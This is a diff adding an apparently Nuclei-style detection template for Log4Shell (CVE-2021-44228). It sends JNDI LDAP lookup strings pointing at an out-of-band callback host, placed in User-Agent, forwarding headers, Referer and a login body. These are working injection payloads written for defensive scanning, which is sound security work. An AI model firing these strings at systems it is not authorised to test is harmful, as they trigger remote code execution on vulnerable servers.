@@ -1,0 +1,56 @@
+id: log4shell-detection
+
+info:
+  name: Apache Log4j2 Remote Code Execution (Log4Shell)
+  author: security-lab
+  severity: critical
+  description: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+    - https://github.com/apache/logging-log4j2/pull/608
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  tags: cve,cve2021,rce,jndi,log4j,critical,oast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/test}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "ldap"
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '.*'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/test}"
+      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}/test}"
+      X-Real-IP: "${jndi:ldap://{{interactsh-url}}/test}"
+      X-Originating-IP: "${jndi:ldap://{{interactsh-url}}/test}"
+      X-Remote-IP: "${jndi:ldap://{{interactsh-url}}/test}"
+      X-Remote-Addr: "${jndi:ldap://{{interactsh-url}}/test}"
+      Referer: "${jndi:ldap://{{interactsh-url}}/test}"
+    body: "username=${jndi:ldap://{{interactsh-url}}/test}&password=test"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "ldap"
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '.*'
